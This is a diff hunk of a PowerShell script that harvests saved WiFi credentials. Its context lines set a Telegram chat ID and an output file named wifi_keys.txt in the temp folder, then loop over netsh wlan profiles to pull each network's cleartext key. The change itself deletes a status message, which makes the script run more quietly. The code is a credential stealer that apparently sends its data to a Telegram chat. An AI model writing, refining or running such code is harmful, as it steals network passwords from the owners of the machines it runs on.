@@ -3,7 +3,6 @@ $chatId = "7373222328"
 $outputFile = "$env:TEMP\wifi_keys.txt"
 
 # 1. Extract WiFi Names and Keys
-Write-Host "Extracting WiFi data..." -ForegroundColor Cyan
 $wifiData = netsh wlan show profiles | Select-String "\:(.+)$" | ForEach-Object {
     $name = $_.Matches.Groups[1].Value.Trim()
     $pass = netsh wlan show profile name="$name" key=clear | Select-String "Key Content\W+\:(.+)$" | ForEach-Object { $_.Matches.Groups[1].Value.Trim() }
